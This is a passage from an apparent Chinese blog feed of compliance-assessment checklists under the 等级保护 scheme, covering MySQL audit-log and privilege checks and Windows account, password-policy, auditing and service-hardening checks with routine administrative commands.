<p>查看各管理员账户权限设置是否与实际情况对应<br>注；此项至少要包括系统管理员和审计管理员才能算符合<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141620093.png" alt="image-20220714162029039"></p>
<h2 id="应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"><a href="#应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则" class="headerlink" title="应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"></a>应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则</h2><ol>
<li>登录不同的用户，验证是否存在越权访问的情形<br>注；通常情况下是由系统管理员来配置策略，基本上算默认符合</li>
<li>访问控制策略<br> 询问输出的以下权限列是是否与管理员制定的访问控制策略及规则一致<br> <code>mysql&gt;select * from mysql.user\G </code><br> 检查用户权限列表<br> <img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621923.png" alt="image-20220714162104863"><br> <code>mysql&gt;select * from mysql.db\G</code><br> 检查数据库权限列表<br> <code>mysql&gt;select * from mysql.tables_priv\G</code><br> 检查用户表权限列表<br> <img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621679.png" alt="image-20220714162120630"></li>
</ol>
<h2 id="访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级"><a href="#访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级" class="headerlink" title="访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级"></a>访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级</h2><p>此项主要检查访问的主体和客体是什么级别的<br>注；通常情况下数据库层面主体为用户及，客体为数据库表级</p>
<h2 id="应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问"><a href="#应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问" class="headerlink" title="应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问"></a>应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问</h2><h1 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h1><h2 id="应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计"><a href="#应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计" class="headerlink" title="应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计"></a>应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;log_%&#x27;</span>;</span><br><span class="line">查看二进制日志、慢查询日志、错误日志、操作日志是否开启</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;值为OFF或<span class="number">0</span>表示未开启</span><br><span class="line">核查是否采取第三方工具增强MySQL日志功能。</span><br><span class="line">若有，记录第三方审计工具的审计内容，</span><br><span class="line">查看是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621341.png" alt="image-20220714162143301"></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141621831.png" alt="image-20220714162157761"></p>
<ul>
<li><p><strong>二进制日志</strong><br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141622949.png" alt="image-20220714162220861"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_bin = LOG_NAME：         　　             （只读变量）只能通过修改配置文件来指定是否启用二进制日志（全局的）　　　　　#my.cnf配置文件中没有log_bin的配置，表示未开启二进制日志，如果存在log_bin的配置，则表示开启了二进制日志，同时，二进制日志文件的名称将会以log_bin对应的值为文件名前缀，文件默认位置在/var/lib/mysql/下，二进制日志文件的后缀名会进行自动编号，每次日志滚动后，后缀名编号自动加1.</span><br><span class="line">log_bin_basename = /var/lib/mysql/mysql-bin： 指定二进制日志的文件的基名</span><br><span class="line">log_bin_index = /var/lib/mysql/mysql-bin.index：指定二进制日志文件的索引文件</span><br><span class="line">binlog_format = STATEMENT|ROW|MIXED：      　 指定基于哪种方式进行记录　　　　　　　　　　STATEMENT:　　　　　　　　　  　基于“语句”记录　　　　　　　　　　ROW:　　　　　　　　　　　　   　基于“行”记录　　　　　　　　　　MIXED:　　　　　　　　　　　　　 让系统自行判定该基于哪种方式记录sync_binlog = 1|0：                           设定是否启动二进制日志同步功能</span><br><span class="line">             --&gt;每次提交事务，会将缓存中的内存刷新到二进制日志文件中。</span><br><span class="line">             --&gt;默认每个sql语句是一个事务，而且默认事务会自动提交，所以，默认的性能很差　　　　　　　　--&gt;此值为0时，表示当事务提交后，不会立即将内存中的binlog刷新到磁盘中；安全性最差，性能最高　　　　　　　　--&gt;此值为1时，表示每一次事务提交后，都会立即将内存中的二进制文件同步到磁盘中；安全性最高，性能最差　　　　　　　　--&gt;还能设置为N，当设置为3时，表示每3次事务提交后，将binlog从内存刷写到磁盘一次，值设置的越大，有可能丢失的日志数据越多，但性能会越好max_binlog_size = SIZE：                     指定二进制日志文件的上限，超过上限会滚动，以字节为单位（默认为1G，为1073741824B）</span><br><span class="line">max_binlog_cache_size = SIZE：               指定二进制日志缓存空间大小，空间被填满，会自动滚动</span><br><span class="line">sql_log_off = on|off：                       是否将一般的查询操作记录到二进制日志中</span><br><span class="line">sql_log_bin = ON |OFF：                     　指定是否启用二进制日志（会话级别）</span><br><span class="line">log_bin_trust_function_creators = on|off：  　指定是否允许创建可能导致不安全的函数</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>慢查询日志</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141622984.png" alt="image-20220714162252905"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 slow_query_log = OFF|ON  （0|1）　　　　　　#开启慢查询日志</span><br><span class="line">2 slow_query_log_file = LOCALHOST-SLOW.log #慢查询日志的文件路径</span><br><span class="line">3 long_query_time  　　　　　　　　　　　　　　 #慢查询时长；默认是10s</span><br><span class="line">4 log_slow_rate_limit　　　　　　　　　　　　　 #如果要记录的慢查询日志非常多的话，会按照速率来记录，默认1秒记录一个</span><br><span class="line">5 log_slow_verbosity=full | query_plan　　　 #记录的详细级别</span><br><span class="line">6 log_output 　　　　　　　　　　　　　　　　　　 #指定将记录到的查询保存到什么位置</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>错误日志</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%log_error%&#x27;</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%log_warnings%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141623108.png" alt="image-20220714162314055"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 log_error = /var/log/mysql_error.log　　#指定错误日志的输出位置</span><br><span class="line">2 log_warnings 为0， 表示不记录告警信息。</span><br><span class="line">3 log_warnings 为1， 表示告警信息写入错误日志。</span><br><span class="line">4 log_warnings 大于1， 表示各类告警信息，例如有关网络故障的信息和重新连接信息写入错误日志。(默认为2)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>操作日志</strong></p>
</li>
</ul>
<h2 id="审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"><a href="#审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息" class="headerlink" title="审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"></a>审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</h2><h3 id="执行下列语句"><a href="#执行下列语句" class="headerlink" title="执行下列语句:"></a>执行下列语句:</h3><p>mysql&gt;show master status;查看当前日志<br>根据日志存放路径，查看输出的日志内容</p>
<h3 id="核查是否采取第三方工具增强MySQL日志功能。"><a href="#核查是否采取第三方工具增强MySQL日志功能。" class="headerlink" title="核查是否采取第三方工具增强MySQL日志功能。"></a>核查是否采取第三方工具增强MySQL日志功能。</h3><p>若有，记录第三方审计工具的审计内容，查看是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息<br>注；只要开启了审计功能，此项默认符合</p>
<h2 id="应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等"><a href="#应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等" class="headerlink" title="应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等"></a>应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等</h2><p>询问管理员</p>
<h2 id="应对审计进程进行保护，防止未经授权的中断"><a href="#应对审计进程进行保护，防止未经授权的中断" class="headerlink" title="应对审计进程进行保护，防止未经授权的中断"></a>应对审计进程进行保护，防止未经授权的中断</h2><p>切换开放状态的账户（非root账户）进行测试，看能否中断审计、日志服务：</p>
]]></content>
      <categories>
        <category>等级保护</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>等级保护</tag>
      </tags>
  </entry>
  <entry>
    <title>等级保护-window</title>
    <url>/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4-window/</url>
    <content><![CDATA[<h1 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h1><h2 id="测评项目-a"><a href="#测评项目-a" class="headerlink" title="测评项目 a)"></a>测评项目 a)</h2><p><strong>内容</strong><br>应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换；</p>
<h3 id="应核查用户在登录时是否采用了身份鉴别措施"><a href="#应核查用户在登录时是否采用了身份鉴别措施" class="headerlink" title="应核查用户在登录时是否采用了身份鉴别措施"></a>应核查用户在登录时是否采用了身份鉴别措施</h3><p>身份标识功能（用户名）属于windows自带功能。用户进行鉴别就是登录时需要你输入用户名、口令的行为，不是强制开启的，可以在某种程度上取消掉。</p>
<p>针对本地登录，使用<strong>Win+R</strong>打开运行框，在里面内输入<strong>netplwiz</strong>，则会出现用户账户页面<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140939004.png" alt="image-20220714093905934"></p>
<ul>
<li>如果不勾选红框内容，则表示下次开机时会跳过验证直接登录Admin账号。但是并不是任何情况都会跳过登录，账号切换、睡眠、锁定、注销都需要再次进行身份鉴别。</li>
<li>如果某用户是空口令，那么肯定不能达到该要求。</li>
</ul>
<h3 id="应核查用户列表确认用户身份标识是否具有唯一性"><a href="#应核查用户列表确认用户身份标识是否具有唯一性" class="headerlink" title="应核查用户列表确认用户身份标识是否具有唯一性"></a>应核查用户列表确认用户身份标识是否具有唯一性</h3><p>window自动实现，即用户名或用户ID不能相同。默认符合</p>
<h3 id="应核查用户配置信息或测试验证是否不存在空口令用户"><a href="#应核查用户配置信息或测试验证是否不存在空口令用户" class="headerlink" title="应核查用户配置信息或测试验证是否不存在空口令用户"></a>应核查用户配置信息或测试验证是否不存在空口令用户</h3><p>空口令去查就能知道，略过</p>
<h3 id="应核查用户鉴别信息是否具有复杂度要求并定期更换"><a href="#应核查用户鉴别信息是否具有复杂度要求并定期更换" class="headerlink" title="应核查用户鉴别信息是否具有复杂度要求并定期更换"></a>应核查用户鉴别信息是否具有复杂度要求并定期更换</h3><p><strong>复杂度要求</strong> </p>
<ol>
<li>要看口令有没有达到实际要求的复杂度。</li>
<li>要看windows是否配置了复杂度安全策略</li>
</ol>
<ul>
<li>在 Win+R 中输入 <code>secpol.msc</code>可以打开本地安全策略<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140939999.png" alt="image-20220714093951938"><br>可以看到密码的复杂度以及达到了需要的要求<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140940522.png" alt="image-20220714094017460"></li>
</ul>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140941242.png" alt="image-20220714094118194"></p>
<ul>
<li><strong>定期更换</strong><br>这个就是看口令的更换周期在CMD中输入<code>net user 用户名 </code>查看上一次设置密码的时间<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140941634.png" alt="image-20220714094140582"><br>或者我们也可以直接看密码策略里面，里面都有写密码最长使用时间<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140942425.png" alt="image-20220714094204382"><br>对于口令更换策略还需要注意计算机管理-本地用户和组-用户中<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140942126.png" alt="image-20220714094233074"><br>如果这里勾选了密码永不过期的话，上面的时间策略也就失效了。<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140942888.png" alt="image-20220714094248837"></li>
</ul>
<h2 id="测评项目-b"><a href="#测评项目-b" class="headerlink" title="测评项目 b)"></a>测评项目 b)</h2><p><strong>内容</strong><br>应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施</p>
<h3 id="应核查是否配置并启用了登录失败处理功能，是否配置并启用了限制非法登录功能，非法登录达到一定次数后采取特定动作，如账户锁定等"><a href="#应核查是否配置并启用了登录失败处理功能，是否配置并启用了限制非法登录功能，非法登录达到一定次数后采取特定动作，如账户锁定等" class="headerlink" title="应核查是否配置并启用了登录失败处理功能，是否配置并启用了限制非法登录功能，非法登录达到一定次数后采取特定动作，如账户锁定等"></a>应核查是否配置并启用了登录失败处理功能，是否配置并启用了限制非法登录功能，非法登录达到一定次数后采取特定动作，如账户锁定等</h3><p>这个只用看账户锁定策略的锁定时间和次数就行，一般是5次&#x2F;30min<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140943323.png" alt="image-20220714094306272"></p>
<h3 id="应核查是否配置并启用了登录连接超时及自动退出功能"><a href="#应核查是否配置并启用了登录连接超时及自动退出功能" class="headerlink" title="应核查是否配置并启用了登录连接超时及自动退出功能"></a>应核查是否配置并启用了登录连接超时及自动退出功能</h3><p>这个只用看屏幕保护程序或者睡眠时间就行，小于30min即可。</p>
<h2 id="测评项目-c"><a href="#测评项目-c" class="headerlink" title="测评项目 c)"></a>测评项目 c)</h2><p><strong>内容</strong><br>当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听</p>
<h3 id="应核查是否采用加密等安全方式对系统进行远程管理，防止鉴别信息在网络传输过程中被窃听"><a href="#应核查是否采用加密等安全方式对系统进行远程管理，防止鉴别信息在网络传输过程中被窃听" class="headerlink" title="应核查是否采用加密等安全方式对系统进行远程管理，防止鉴别信息在网络传输过程中被窃听"></a>应核查是否采用加密等安全方式对系统进行远程管理，防止鉴别信息在网络传输过程中被窃听</h3><p>如果服务器没有连接外部网络，没有WIFI，管理服务器只能去机房操作，就不村子啊远程管理，即符合。<br>如果存在远程管理，则：</p>
<ol>
<li>远程桌面<br>计算机配置—管理模板—window组件—远程桌面服务—远程桌面会话主机—安全<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140943683.png" alt="image-20220714094330604"><br>或者运行tsconfig.msc，打开远程桌面会话主机配置<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140943474.png" alt="image-20220714094358393"><br>还有就是要看有没有打开telnet，打开了就默认不符合，因为telnet默认不加密。<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140944760.png" alt="image-20220714094418704"></li>
</ol>
<h2 id="测评项目-d"><a href="#测评项目-d" class="headerlink" title="测评项目 d)"></a>测评项目 d)</h2><p><strong>内容</strong><br>应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现</p>
<h3 id="应核查是否采用动态口令、数字证书、生物技术和设备指纹等两种或两种以上组合的鉴别技术对用户身份进行鉴别"><a href="#应核查是否采用动态口令、数字证书、生物技术和设备指纹等两种或两种以上组合的鉴别技术对用户身份进行鉴别" class="headerlink" title="应核查是否采用动态口令、数字证书、生物技术和设备指纹等两种或两种以上组合的鉴别技术对用户身份进行鉴别"></a>应核查是否采用动态口令、数字证书、生物技术和设备指纹等两种或两种以上组合的鉴别技术对用户身份进行鉴别</h3><p>测评项中的两种组合的鉴别技术，就是使用三个要素里至少两个不同的要素，比如“用户名、口令”+“数字证书”。</p>
<p>所以如果只是重复的使用其中一种要素，比如登录时需要输入两次不同的“用户名、口令”，那就不叫双因素认证，而叫两步验证。</p>
<h3 id="应核查其中一种鉴别技术是否使用密码技术来实现"><a href="#应核查其中一种鉴别技术是否使用密码技术来实现" class="headerlink" title="应核查其中一种鉴别技术是否使用密码技术来实现"></a>应核查其中一种鉴别技术是否使用密码技术来实现</h3><p>使用“密码”进行登录，不代表一定就使用了“密码技术”。</p>
<p>当然，纯粹的口令验证应该是不存在的，无论是windows还是linux，你的账户口令肯定都是加过密的，比如linux，存的其实是使用单向散列算法（如md5）对你的口令进行计算得出来的杂凑值。</p>
<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="测评项目-a-1"><a href="#测评项目-a-1" class="headerlink" title="测评项目 a)"></a>测评项目 a)</h2><p><strong>内容</strong><br>应对登录的用户分配账户和权限</p>
<h3 id="应核查是否为用户分配了账户和权限及相关设置情况"><a href="#应核查是否为用户分配了账户和权限及相关设置情况" class="headerlink" title="应核查是否为用户分配了账户和权限及相关设置情况"></a>应核查是否为用户分配了账户和权限及相关设置情况</h3><p>本地用户的权限分配直接问就行<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140944207.png" alt="image-20220714094441147"></p>
<h3 id="应核查是否已禁用或限制匿名、默认账户的访问权限"><a href="#应核查是否已禁用或限制匿名、默认账户的访问权限" class="headerlink" title="应核查是否已禁用或限制匿名、默认账户的访问权限"></a>应核查是否已禁用或限制匿名、默认账户的访问权限</h3><p>对于默认账户、匿名账户的访问权限的限制，就是对是guest、users、Everyone组的权限的限制。但是admin没必要限制权限</p>
<p>对于guest来说，可以看看它是否被禁用，guest无法删除，但是可以被禁用</p>
<p>总之都可以在这里查看账户的权限<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140945581.png" alt="image-20220714094500501"></p>
<h2 id="测评项目-b-1"><a href="#测评项目-b-1" class="headerlink" title="测评项目 b)"></a>测评项目 b)</h2><p><strong>内容</strong><br>应重命名或删除默认账户，修改默认账户的默认口令</p>
<h3 id="应核查是否已经重命名默认账户或默认账户已被删除"><a href="#应核查是否已经重命名默认账户或默认账户已被删除" class="headerlink" title="应核查是否已经重命名默认账户或默认账户已被删除"></a>应核查是否已经重命名默认账户或默认账户已被删除</h3><p>windows的默认账户就是administrator和guest。</p>
<ol>
<li><strong>administrator</strong>，只用看是否将administrator进行了重命名或者禁用，windows不存在默认口令，默认就符合（当然空口令是不符合的）。</li>
<li><strong>guest</strong>，检查是否被禁用即可</li>
</ol>
<h3 id="应核查是否已修改默认账户的默认口令"><a href="#应核查是否已修改默认账户的默认口令" class="headerlink" title="应核查是否已修改默认账户的默认口令"></a>应核查是否已修改默认账户的默认口令</h3><p>上↑↑↑↑</p>
<h2 id="测评项目-c-1"><a href="#测评项目-c-1" class="headerlink" title="测评项目 c)"></a>测评项目 c)</h2><p><strong>内容</strong><br>应及时删除或停用多余的、过期的账户，避免共享账户的存在</p>
<h3 id="应核查是否不存在多余或过期账户，管理员用户与账户之间是否一一对应"><a href="#应核查是否不存在多余或过期账户，管理员用户与账户之间是否一一对应" class="headerlink" title="应核查是否不存在多余或过期账户，管理员用户与账户之间是否一一对应"></a>应核查是否不存在多余或过期账户，管理员用户与账户之间是否一一对应</h3><p>这个一一对应去问问核实就行了</p>
<h3 id="应测试验证多余的、过期的账户是否被删除或停用"><a href="#应测试验证多余的、过期的账户是否被删除或停用" class="headerlink" title="应测试验证多余的、过期的账户是否被删除或停用"></a>应测试验证多余的、过期的账户是否被删除或停用</h3><p>多余过期账户在这里就能看到<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140945607.png" alt="image-20220714094527546"></p>
<h2 id="测评项目-d-1"><a href="#测评项目-d-1" class="headerlink" title="测评项目 d)"></a>测评项目 d)</h2><p><strong>内容</strong><br>应授予管理用户所需的最小权限，实现管理用户的权限分离</p>
<h3 id="应核查是否进行角色划分-，应核查管理用户的权限是否已进行分离，应核查管理用户权限是否为其工作任务所需的最小权限"><a href="#应核查是否进行角色划分-，应核查管理用户的权限是否已进行分离，应核查管理用户权限是否为其工作任务所需的最小权限" class="headerlink" title="应核查是否进行角色划分 ，应核查管理用户的权限是否已进行分离，应核查管理用户权限是否为其工作任务所需的最小权限"></a>应核查是否进行角色划分 ，应核查管理用户的权限是否已进行分离，应核查管理用户权限是否为其工作任务所需的最小权限</h3><p>这一项一起写了，主要就是看权限有没有分离<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140945652.png" alt="image-20220714094553584"><br>用户权限表<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140946953.png" alt="image-20220714094631833"></p>
<h2 id="测评项目-e"><a href="#测评项目-e" class="headerlink" title="测评项目 e)"></a>测评项目 e)</h2><p><strong>内容</strong><br>应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则</p>
<h3 id="应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"><a href="#应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则" class="headerlink" title="应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"></a>应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则</h3><p>主要还是看用户有没有能越权访问<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140947429.png" alt="image-20220714094702362"></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140947861.png" alt="image-20220714094719812"></p>
<h2 id="测评项目-f"><a href="#测评项目-f" class="headerlink" title="测评项目 f)"></a>测评项目 f)</h2><p><strong>内容</strong><br>访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级</p>
<h3 id="应核查访问控制策略的控制粒度是否达到主体为用户级或进程级，客体为文件、数据库表、记录或字段级"><a href="#应核查访问控制策略的控制粒度是否达到主体为用户级或进程级，客体为文件、数据库表、记录或字段级" class="headerlink" title="应核查访问控制策略的控制粒度是否达到主体为用户级或进程级，客体为文件、数据库表、记录或字段级"></a>应核查访问控制策略的控制粒度是否达到主体为用户级或进程级，客体为文件、数据库表、记录或字段级</h3><p>主要看是否做了访问控制策略，以及策略是否明确到某个用户（而不仅仅是用户组），某个文件（不仅仅是文件夹）</p>
<h2 id="测评项目-g"><a href="#测评项目-g" class="headerlink" title="测评项目 g)"></a>测评项目 g)</h2><p><strong>内容</strong><br>应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问</p>
<h3 id="应核查是否对主体、客体设置了安全标记，安全标记控制主体对客体访问的强制访问控制策略"><a href="#应核查是否对主体、客体设置了安全标记，安全标记控制主体对客体访问的强制访问控制策略" class="headerlink" title="应核查是否对主体、客体设置了安全标记，安全标记控制主体对客体访问的强制访问控制策略"></a>应核查是否对主体、客体设置了安全标记，安全标记控制主体对客体访问的强制访问控制策略</h3><p>window默认不符合</p>
<h1 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h1><h2 id="测评项目-a-2"><a href="#测评项目-a-2" class="headerlink" title="测评项目 a)"></a>测评项目 a)</h2><p><strong>内容</strong><br>应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计</p>
<h3 id="应核查是否开启了安全审计功能"><a href="#应核查是否开启了安全审计功能" class="headerlink" title="应核查是否开启了安全审计功能"></a>应核查是否开启了安全审计功能</h3><p>在运行框中依次输入CompMgmtLauncher、eventvwr、compmgmt.msc<br>依次打开能够查看安全审计策略<br>服务器管理器<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140947919.png" alt="image-20220714094739835"><br>事件查看器<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140948885.png" alt="image-20220714094800811"><br>计算机管理<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140948750.png" alt="image-20220714094822668"></p>
<h3 id="应核查安全审计范围是否覆盖到每个用户"><a href="#应核查安全审计范围是否覆盖到每个用户" class="headerlink" title="应核查安全审计范围是否覆盖到每个用户"></a>应核查安全审计范围是否覆盖到每个用户</h3><p>一般来说开启了审计功能这项就符合。</p>
<h3 id="应核查是否对重要的用户行为和重要安全事件进行审计"><a href="#应核查是否对重要的用户行为和重要安全事件进行审计" class="headerlink" title="应核查是否对重要的用户行为和重要安全事件进行审计"></a>应核查是否对重要的用户行为和重要安全事件进行审计</h3><p>直接打开管理工具-本地安全策略能够看到是否开启审计功能。<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140948624.png" alt="image-20220714094838560"></p>
<h2 id="测评项目-b-2"><a href="#测评项目-b-2" class="headerlink" title="测评项目 b)"></a>测评项目 b)</h2><p><strong>内容</strong><br>审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</p>
<h3 id="应核查审计记录信息是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"><a href="#应核查审计记录信息是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息" class="headerlink" title="应核查审计记录信息是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"></a>应核查审计记录信息是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</h3><ol>
<li>首先要注意时间的问题，如果服务器联网则时间默认符合。如果不联网则无法保证。对于局域网内可以设置一台ntp服务器来解决这个问题</li>
<li>其余信息的话，windows的审计记录是包括要求字段的，理论上默认就符合该测评项。</li>
</ol>
<h2 id="测评项目-c-2"><a href="#测评项目-c-2" class="headerlink" title="测评项目 c)"></a>测评项目 c)</h2><p><strong>内容</strong><br>应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等</p>
<p>此项还未编辑</p>
<h2 id="测评项目-d-2"><a href="#测评项目-d-2" class="headerlink" title="测评项目 d)"></a>测评项目 d)</h2><p><strong>内容</strong><br>应对审计进程进行保护，防止未经授权的中断</p>
<h3 id="应测试验证通过非审计管理员的其他账户来中断审计进程，验证审计进程是否受到保护"><a href="#应测试验证通过非审计管理员的其他账户来中断审计进程，验证审计进程是否受到保护" class="headerlink" title="应测试验证通过非审计管理员的其他账户来中断审计进程，验证审计进程是否受到保护"></a>应测试验证通过非审计管理员的其他账户来中断审计进程，验证审计进程是否受到保护</h3><p>这一项和a差不多windows一般默认开启，要关闭还要用一些方法。</p>
<h1 id="入侵防范"><a href="#入侵防范" class="headerlink" title="入侵防范"></a>入侵防范</h1><h2 id="测评项目-a-3"><a href="#测评项目-a-3" class="headerlink" title="测评项目 a)"></a>测评项目 a)</h2><p><strong>内容</strong><br>应遵循最小安装的原则，仅安装需要的组件和应用程序</p>
<h3 id="应核查是否遵循最小安装原则-是否未安装非必要的组件和应用程序"><a href="#应核查是否遵循最小安装原则-是否未安装非必要的组件和应用程序" class="headerlink" title="应核查是否遵循最小安装原则,是否未安装非必要的组件和应用程序"></a>应核查是否遵循最小安装原则,是否未安装非必要的组件和应用程序</h3><p>这一条通过输入<code>appwiz.cpl</code>可以看到，多余或者不明白功能的应用程序可以询问管理员用途。<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140949551.png" alt="image-20220714094921485"></p>
<h2 id="测评项目-b-3"><a href="#测评项目-b-3" class="headerlink" title="测评项目 b)"></a>测评项目 b)</h2><p><strong>内容</strong><br>应关闭不需要的系统服务、默认共享和高危端口</p>
<h3 id="应核查是否关闭了非必要的系统服务和默认共享，是否不存在非必要的高危端口"><a href="#应核查是否关闭了非必要的系统服务和默认共享，是否不存在非必要的高危端口" class="headerlink" title="应核查是否关闭了非必要的系统服务和默认共享，是否不存在非必要的高危端口"></a>应核查是否关闭了非必要的系统服务和默认共享，是否不存在非必要的高危端口</h3><p>这一项不必多说了，非必要的端口一看便知，默认共享就先看服务器管理器的server（一般默认开启），然后在cmd里面输入<code>net share</code>可以查看。<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140949684.png" alt="image-20220714094943600"><br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140950645.png" alt="image-20220714095002591"><br>系统开启的服务看这里就知道了<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140950597.png" alt="image-20220714095019526"></p>
<h2 id="测评项目-c-3"><a href="#测评项目-c-3" class="headerlink" title="测评项目 c)"></a>测评项目 c)</h2><p><strong>内容</strong><br>应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制</p>
<h3 id="应核查配置文件或参数是否对终端接入范围进行限制"><a href="#应核查配置文件或参数是否对终端接入范围进行限制" class="headerlink" title="应核查配置文件或参数是否对终端接入范围进行限制"></a>应核查配置文件或参数是否对终端接入范围进行限制</h3><ol>
<li>不存在远程接入，即只有去机房的物理设备查看，直接跳过</li>
<li>使用远程桌面，主要是看windows防火墙和IP策略&#x2F;硬件防火墙有没有对rdp端口（3389）做策略，或者把rdp的端口号给改了。</li>
</ol>
